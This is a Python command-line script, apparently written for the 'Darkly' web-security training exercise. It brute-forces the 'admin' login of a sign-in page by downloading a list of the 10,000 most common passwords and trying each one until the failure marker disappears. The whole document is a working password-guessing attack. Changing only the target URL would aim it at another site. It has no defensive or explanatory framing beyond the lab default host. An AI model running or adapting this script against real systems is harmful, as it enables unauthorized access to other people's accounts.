import os
import click
import tqdm
import requests

@click.command()
@click.option("--base-url", default="http://darkly/")
@click.option("--username", default="admin")
@click.option("--password-list", default="passwords.txt")
@click.option("--password-list-url", default="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt")
def cli(
    base_url: str,
    username: str,
    password_list: str,
    password_list_url: str,
):
    if not os.path.exists(password_list):
        tqdm.tqdm.write(f"password list is missing, downloading...")
        
        response = requests.get(password_list_url)
        with open(password_list, "w") as fd:
            fd.write(response.text)
    
    with open(password_list) as fd:
        for line in tqdm.tqdm(fd):
            line = line.strip()
            
            response = requests.get(
                base_url,
                params = {
                    "page": "signin",
                    "username": username,
                    "password": line,
                    "Login": "Login"
                }
            )

            if "WrongAnswer" not in response.text:
                tqdm.tqdm.write(f"password: {line}")
                break
    
if __name__ == '__main__':
    cli()
